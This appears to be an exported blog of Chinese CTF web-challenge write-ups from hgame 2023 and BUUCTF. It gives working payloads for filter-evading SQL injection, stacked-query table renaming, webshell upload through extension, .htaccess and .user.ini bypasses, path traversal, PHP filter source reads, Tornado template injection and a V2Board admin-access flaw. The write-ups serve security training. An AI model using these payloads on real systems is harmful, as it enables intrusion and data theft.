re.compile(r&#x27;&quot;id&quot;: &quot;(.+?)&quot;&#x27;)    intro_re = re.compile(r&#x27;&quot;intro&quot;: &quot;(.+?)&quot;&#x27;)    id = id_re.findall(data)    intro = intro_re.findall(data)    dic = dict(zip(intro, id))    return dicdef solve(url, dic):    # 打开浏览器    browser = webdriver.Firefox()    # 打开要访问的页面    browser.get(url)    for i in range(100):        # 刷新        browser.refresh()        time.sleep(2)        # xpath获取问题        key = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/h2[1]&#x27;).text[25:]        # 定位input框        solve_input = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/div/div/div[1]/div/input&#x27;)        # 录入id        solve_input.send_keys(dic[key])        # 模拟点击        btn = browser.find_element(By.XPATH, &#x27;/html/body/div/div[2]/div/button&#x27;)        btn.click()        # 给2秒反应时间        time.sleep(2)        # 模拟取消弹窗        browser.switch_to.alert.dismiss()        if i == 99:            print(browser.page_source)# 从页面源码中找到全员信息filename = &#x27;hint.txt&#x27;dic = getDict(filename)url = &quot;http://week-1.hgame.lwsec.cn:30642&quot;solve(url, dic)\n\n过程中失败了几次，发现他给的member.js中部分id多了几个空格……修改后成功获取flag\n\n\n\nSelenium的安装与Firefox配置以及Selenium基本用法(超详细)Selenium Python 教程\n\nrequests模块session方法后面查看了官方给的wp，分析后发现session方法保存cookie，模拟其实现过程确实可行。下面给出我写的脚本：\ndef solution(url, dic):    s = requests.Session()    # 发送请求，获取cookie，并保存cookie    s.get(url+r&#x27;/api/getQuestion&#x27;)    for i in range(100):        # 获取Question        res = s.get(url+r&#x27;/api/getQuestion&#x27;)        key = json.loads(res.text)[&#x27;message&#x27;]        # 发送Post请求，若正确，则自动修改cookie        data = &#123;&#x27;id&#x27;: dic[key]&#125;        s.post(url+r&#x27;/api/verifyAnswer&#x27;, data=data)        # 获取Score(带着Cookie访问不会set-cookie)        res1 = s.get(url+r&#x27;/api/getScore&#x27;)        print(&#x27;Score&#x27;, json.loads(res1.text)[&#x27;message&#x27;])url = &quot;http://week-1.hgame.lwsec.cn:30277&quot;solution(url, dic)\n在格式上废了很大的劲儿，我手动copy下来的的”hint.txt”是用”utf-8”编码的，而返回的res.textJSON格式字符串中的某特殊字符被处理成其unicode编码，直接对其用正则表达式得到的Intro，与”hint.txt”中的不完全相同，总是显示”KeyError”。（目前还没有弄明白是不是这个原因，求解答）\n在给出的wp中看到json.loads()方法，该方法能解码 JSON 数据（字符串），返回 Python 字段的数据类型，尝试了下，成功拿到flag：\n\n\n\n爬虫——cookie模拟登陆\n\nT4 [hgame 2023]Show Me Your Beauty题目地址\n文件上传题。给了我们前端JS代码，其中的一部分贴在下面\nfunction post() &#123;    var file = document.getElementById(&quot;file&quot;);    //console.log(file.files[0].name)    var ext = file.value.toLowerCase().substr(file.value.lastIndexOf(&quot;.&quot;));    if (!/\\.(?:jpg|png|gif)$/.test(ext)) &#123;      alert(&quot;Invalid file extensions!&quot;);      return false;    &#125; else \t...&#125;\n\n可以看到前端过滤掉了jpg|png|gif以外的其他后缀名，因为是前端，先上传图片马webshell.jpg，再抓包修改后缀就行了。\n\n\n可以看到，还是被过滤了，于是我想到传一个.htaccess试试，结果也被过滤了。去偷其他wp的思路，发现文件后缀的检查对于大小写竟然是敏感的，直接改修改后缀为.PHP成功绕过检查上传，并返回：\n&#123;&quot;json&quot;:&quot;Upload Successfully! .\\/img\\/webshell.PHP  5s\\u540e\\u9875\\u9762\\u81ea\\u52a8\\u5237\\u65b0&quot;&#125;\n\n直接蚁剑连接一下，找到Flag（注意一个点，webshell连接密码有时候不加引号’’可能会连接失败）。\nT5 [hgame 2023]Git Leakage题目地址\n题目名“git泄露”，我们直接http://week-2.hgame.lwsec.cn:31944/.git/查看.git文件，果然成功进入。\nhooks：存放一些shell脚本info：存放仓库的全局性排除文件信息logs：保存所有更新的引用记录objects：存放所有的git对象refs：存储指向分支的提交对象的指针config：仓库的配置信息index：暂存区（二进制）HEAD：映射到ref的引用\n\n借助GitHack工具，重建还原工程源代码，直接得到文件”Th1s_1s-flag”，打开获取flag:\n\n\n\n\n\n\n工具GitHack-py3\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"集训WriteUp-2","url":"/2023/01/15/%E9%9B%86%E8%AE%ADWriteUp-2/","content":"2023-01-15 WP\nT1 [hgame 2023]v2board题目地址\n题目考察去年12月份的一个V2Board v1.6.1版本的Admin.php越权访问漏洞（注册个号进去看看就会发现左下角的”V2Board v1.6.1”，放bing上一查就能看到）。其原理这里就不赘述，放一个利用的过程：\n\n任意注册一个账号，通过/api/v1/passport/auth/login接口登录时用抓包工具获取响应包的auth_data\n\n\n\n\n然后访问/api/v1/user/info接口，并将上述获得的auth_data作为authorization头发送，这一步的目的是让服务器将普通用户的Authorization头写入缓存中（事实上这里自动实现了，auth_data 会随着登录缓存于 Redis ）\n\n\n\n\n最后只要带上这个Authorization头即可访问所有的管理员接口，比如/api/v1/admin/user/fetch等\n\n\n\n可以直接在上图找到admin的订阅token（对着源码找接口找了半天，以为订阅会在plan接口中。没注意到“众所周知v2board的管理员信息和用户信息都在user表，仅用is_admin字段区分是否管理员”，纯纯大怨种）\n\n路由接口源码V2Board Admin.php 越权访问漏洞v2board v.1.6.1 机场面板管理接口越权漏洞分析\n\n2023-01-23 WP\nT2 [hgame 2023]Search Commodity题目地址\n弱密码登录，找个字典用Burp Suite暴力破解一下就好，密码比较常见：\n用户名:user01密  码:admin123\n\n“简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货）”，从题目描述基本上能够判断考察sql注入，但是不知道过滤了什么，需要自己测试。先按要求输入id数字1，查询结果为hard disk 1，然后试一试and 1，查询结果不变，不难猜测是将部分关键字用replace替换掉了，这跟我上一周遇到的sql题([极客大挑战 2019]BabySQL)很像。同样的办法可以测出部分我们将要用到的其他被过滤的字符：\nand, or, select, union, from, where, database, =, /**/, &lt;, &gt;\n\n值得注意的是，这里空格也被过滤了：输入o r1查询结果不变。可能是先对输入的内容中所有的空格进行了去除，然后再对其他字符进行二次过滤。绕过空格可以使用注释符/**/和括号()。之后再用双写绕过即可。\n爆字段数\n0//**/**/oorrder//**/**/by//**/**/4#                    //测试为4时报错，故字段数为3\n\n判断回显位为2, 3\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,2,3#   \n\n爆库名为se4rch，很奇怪，这里只能把库名放第二个回显位，否则回显Not Found 0，留个疑问。\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,ddatabaseatabase(),3#                           \n\n爆表名，’&#x3D;’可以用’like’或’!&lt;&gt;’绕过，得到”5ecret15here,L1st,user1nf0”\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(table_name),3/*/**/*/ffromrom(infoorrmation_schema.tables)wwherehere(table_schema//**/**/like//**/**/ddatabaseatabase())#\n\n爆字段名，得到”f14gggg1shere”\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(column_name),3/*/**/*/ffromrom(infoorrmation_schema.columns)wwherehere(table_name//**/**/like//**/**/&#x27;5ecret15here&#x27;)#\n\n爆数据\n0//**/**/uunionnion//**/**/sselectelect//**/**/1,group_concat(f14gggg1shere),3/*/**/*/ffromrom(5ecret15here)#\n\n成功拿到Flag:\nhgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;\n\nT3 [hgame 2023]Designer题目地址\n题目给了源码。\n2023-01-23 WP\nT4 [强网杯 2019]随便注题目地址\n是一道sql注入题，先用1&#39;判断一下闭合方式，回显报错信息：\nerror 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1\n\n是用单引号&#39;闭合，万能密码1&#39; or 1=1#能爆出所有数据。下面按部就班的爆字段数(两个字段)：\n1&#x27; order by 3#\n\n但是在爆表名的时候发现select被过滤了，且大小写绕过无效。\nreturn preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);\n\n堆叠注入学习(堆叠查询，Stacked Queries)联合查询不可用，这里补充一下堆叠查询的知识。堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。\n堆叠注入原理在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。如下图:\n\n\n堆叠注入利用利用这一点，我们可以用1&#39;;show databases;#查出库名，用1&#39;;show tables;#查出表名:\n\n\n然后用desc查表结构。\n\n这里补充一点，所有数据库对象（数据库名、表名、字段名、索引名等）命名禁止使用MySQL保留关键字，如果要用，就必须加上反引号。对于纯数字的数据库对象也是如此，否则就会报错。\n\n\n\n1&#x27;;desc `1919810931114514`;#\n\n对’1919810931114514’表查一下，找到’flag’字段，但是不能直接进行查询。下面1&#39;;desc words;#查一下’words’的表结构\n\n\n可以看到是两个字段，一个是int型的id，另一个是varchar型的data，又结合输入1时的查询结果，不难推测出提交窗口的查询语句形如:\nselect id,data from words where id =\n\n。因此，只要我们利用堆叠注入更改’1919810931114514’表名为’words’，再把列名flag改成id，然后用既定的查询功能查询’words’表，就可以实现实际上对’1919810931114514’表的查询啦。\n# 更改原words表名:rename table words to bye;# 更改表名:rename table `1919810931114514` to words;# 更改字段名: 【ALTER TABLE &lt;表名&gt; CHANGE &lt;旧字段名&gt; &lt;新字段名&gt; &lt;新数据类型&gt;;】alter table words change flag id varchar(100);\n\nPayload 1# 更改表名、字段名1&#x27;;rename table words to bye;rename table `1919810931114514` to words;alter table words change flag id varchar(100);## 爆数据1&#x27; or 1=1#\n\n预处理语句+堆叠注入这种办法主要是对select的过滤进行绕过。预处理语句使用方式:\nPREPARE name from &#x27;[my sql sequece]&#x27;;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL        语句\n\n预定义语句也可以通过变量进行传递:\nSET @tn = &#x27;hahaha&#x27;;  //存储表名SET @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句\n\n然后利用char()函数将select的ASCII码转换为select字符串，或直接用concat()函数拼接select来绕过就可以了。\nPayload 21&#x27;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#\n\n\n参考这位师傅的WriteUp: [强网杯 2019]随便注 WriteUp(three way)\n\n2023-01-24 WP\nT5 [HCTF 2018]WarmUp题目地址\n一道简单的PHP代码审计。检查得到提示’source.php’，访问给出源码:\n&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;\n\n解题思路访问’hint.php’被告知”flag not here, and flag in ffffllllaaaagggg”，用源代码中的include文件包含就能打开。首先它先判定了传入的是不是空或者是不是字符串，然后用emmm::checkFile进行了三次白名单判断:\nmb_substr(    string $str,    int $start,    int $length = NULL,    string $encoding = mb_internal_encoding())从start开始截取一定长度的字符串strpos(    string $haystack,     string $needle,     int $offset = 0)返回 needle 在 haystack 中首次出现的数字位置\n\n第一次$_page取的是从0（第一个字符）开始到第一次出现 ? 之间的字符串，第二次$_page取的是$page的url解码后从0开始到第一次出现 ? 之间的字符串。\n\n事实上，超全局变量$GET和$REQUEST已经被解码过了。\n\n只需要添加一个hint.php?绕过白名单过滤，然后利用任意文件读取漏洞就能成功读到flag了。\nPayload?file=hint.php?../../../../../../../../ffffllllaaaagggg\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"集训WriteUp-3","url":"/2023/01/28/%E9%9B%86%E8%AE%ADWriteUp-3/","content":"2023-01-28 WP\nT1 [ACTF2020 新生赛]Include题目地址\n点击tips跳转，url为http://6d3271bd-e229-4cb6-8d9f-14c45ac78c60.node4.buuoj.cn:81/?file=flag.php，应该是一个文件包含漏洞，不能直接读出flag，用PHP伪协议访问其源码:\nphp://filter/convert.base64-encode/resource=文件名\n\nPayload?file=php://filter/convert.base64-encode/resource=flag.php\n\n得到flag.php源码的base64编码，解码后找到flag:\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjU5ZGFmNzUtMjUxOS00MDZhLWI2ZjUtNGI5ZWUzOWZmZDQ3fQo=解码结果:&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;659daf75-2519-406a-b6f5-4b9ee39ffd47&#125;\n\n\n文件包含漏洞详解\n\n2023-02-01 WP\nT2 [MRCTF2020]Ez_bypass题目地址\n考点：md5()碰撞，PHP弱类型比较\n给出源码:\nI put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You got the first step&#x27;;        if(isset($_POST[&#x27;passwd&#x27;])) &#123;            $passwd=$_POST[&#x27;passwd&#x27;];            if (!is_numeric($passwd))            &#123;                 if($passwd==1234567)                 &#123;                     echo &#x27;Good Job!&#x27;;                     highlight_file(&#x27;flag.php&#x27;);                     die(&#x27;By Retr_0&#x27;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#x27;You can not get it !&#x27;;            &#125;        &#125;        else&#123;            die(&#x27;only one way to get the flag&#x27;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#x27;Please input first&#x27;);&#125;&#125;Please input first\n\n解题思路要求$id与$gg的md5值相同，而本身值不同。这一点可以利用md5()无法处理数组，如果传入的两个参数都是数组，那么md5()函数返回的都是false来实现。\n接下来需要绕过is_numeric()传入$passwd，并与1234567进行弱类型比较。根据PHP弱类型比较的特性，&#39;1234567a&#39; == &#39;1234567&#39;，从而同时绕过了is_numeric()函数。\n\n若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）\n\nPayloadGET?gg[]=1&amp;&amp;id[]=2POSTpasswd=1234567a\n\n\nhttps://blog.csdn.net/u014029795/article/details/99709333\n\n2023-02-01 WP\nT3 [SUCTF 2019]CheckIn题目地址\n传马试一试：\n\n\n回显”illegal suffix!”，需要改后缀。\n\nillegal suffix:不能上传后缀为php、php4、php5、phtml等可直接被解析的PHP文件\n\n我们改为’webshell.jpg’再次尝试一下，结果回显”&lt;?  in contents!”，用script过滤一下：\n\n\n提示我们”exif_imagetype:not image!”，可尝试用GIF89a文件头欺骗的方式绕过\n\nexif_imagetype:表示判断一个图片的类型（即读取一个图像的第一个字节并检查其签名）\n\n\n\n可以看到，上传成功，且告知我们上传路径”uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fd”。下一步考虑将其解析为php文件，先用上传.htaccess配置文件的办法将.jpg后缀的文件当作php文件解析：\n.htaccess（同样加上GIF89a文件头）GIF89aAddtype application/x-httpd-php .jpg\n\n然而这样不行，可能是没有开放AllowOverride  All，尝试其他办法。\n\nAllowOverride  All    # 启动.htaccess文件的使用\n\n一些关于user.ini的知识.user.ini比.htaccess用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。\nPHP配置项中有两个比较有意思的项（下图第一、四个）：\n\n\n其中的auto_prepend_file表示指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。使用方法很简单，直接写在.user.ini中：\nauto_prepend_file=webshell.jpg\n\n从而可以借助.user.ini轻松让所有php文件都“自动”包含某个文件（这里即’webshell.jpg’），而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell. 当然，前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。\n这里恰好满足条件，我们上传.user.ini文件：\nGIF89aauto_prepend_file=webshell.jpg\n\n然后上传一个图片马webshell.jpg，用蚁剑连接”uploads&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;index.php”即可。\n\nuser.ini文件构成的PHP后门\n\n2023-02-02 WP\nT4 [护网杯 2018]easy_tornado题目地址\n考点：服务器模板注入（SSTI），Tornado 是使用 Python 开发的全栈式（full-stack）Web 框架和异步网络库。与以前提到过的 Flask 一样都是 Python 的一种 Web 开发框架。Tornado render 是 Python 中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对 render 内容可控，不仅可以注入 XSS 代码，而且还可以通过 &#123;&#123;&#125;&#125; 进行传递变量和执行简单的表达式。\n三个文件，用GET方式访问，如flag.txt : “file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;27bc54e1e85bcd53729ca9fc2c325cc7”\n/flag.txtflag in /fllllllllllllag/welcome.txtrender/hints.txtmd5(cookie_secret+md5(filename))\n\n不传参访问”file”会来到Error页面error?msg=Error，修改msg参数为&#123;&#123;1&#125;&#125;，发现存在SSTI漏洞\n\n\n如果要访问/fllllllllllllag，势必要先弄清楚它的filehash是什么，&#x2F;hints.txt提示我们可能是cookie_secret+md5(filename)的md5值，那么下一步要找的就是cookie_secret的值。\n\ncookie_secret 是存在于 settings 中的，settings 又作为参数传入了 Application 构造函数，因此可以通过 self.application.settings 来获取到 cookie_secret。又因为根据官方文档， RequestHandler.settings 的别名是 self.application.settings，且 handler 指向处理当前这个页面的 RequestHandler 对象，故最终的效果就是可以直接通过 handler.settings 来得到 cookie_secret 的值。\n\n获取cookie_secreterror?msg=&#123;&#123;handler.settings&#125;&#125;\n\n\n\n计算md5计算md5值即可：\nimport hashlibcookie=&#x27;f7119331-0e70-4070-b8b5-e72a76fd878f&#x27;filename=&#x27;/fllllllllllllag&#x27;md5_filename=hashlib.md5(filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()word=cookie+md5_filenameflag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()print(flag)## 303175bc3fca5948d03a5f9688fbde51\n\nPayload/file?filename=/fllllllllllllag&amp;filehash=303175bc3fca5948d03a5f9688fbde51\n\n\nXCTF系列 &#x2F;&#x2F; Web | easytornado\n\n2023-02-02 WP\nT5 [GYCTF2020]Blacklist题目地址\n与 [强网杯 2019]随便注 很类似，无法用联合查询，选择堆叠注入。不同点在于这里alter等修改表名的命令和PREPARE预处理命令也被过滤了。\nreturn preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;,$inject);\n\n先查表名：\n1&#x27;;show tables;#\n\n得到”FlagHere”和”words”两个表，能否直接依靠&#x2F;**&#x2F;绕过检查呢？\n1&#x27;;sel/**/ect flag from `FlagHere`;#\n\n结果是啥也没有。\n学习一种新的操作 HANDLER :\n\nHANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭\n\n下面是一个用例:\nHANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE\n\n于是修改Payload\nPayload1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#\n\n\n-眼里有星河- [GYCTF2020]Blacklist\n\n2023-02-03 WP\nT6 [GXYCTF2019]BabyUpload题目地址\n上传后缀不能含有ph，且文件内容过滤&lt;?，利用 script + .hatcess文件 + 图片马 进行绕过\n图片马上传成功，并给出了上传路径”&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;6cdfb1db05f2e76413034fd35b6cd993&#x2F;webshell.jpg”，上传.hatcess文件时被检测出上传类型“漏骨”，这里修改一下Content-Type: image/jpeg，也成功上传。\n尝试直接用蚁剑连接，成功找到Flag.\nhttp://d03a8dc5-50d1-4555-87af-0bfcede2efc4.node4.buuoj.cn:81/upload/6cdfb1db05f2e76413034fd35b6cd993/webshell.jpg\n\n\n做这题本来是看到有个wp写着system被禁用了，想学一点其他技巧，没想到蚁剑直接连上了……这里也补充一下叭:\n\nshow_source() 函数对文件进行语法高亮显示file_get_contents() 整个文件读入一个字符串中\n\n","categories":["Write Up"],"tags":["CTF","web"]}]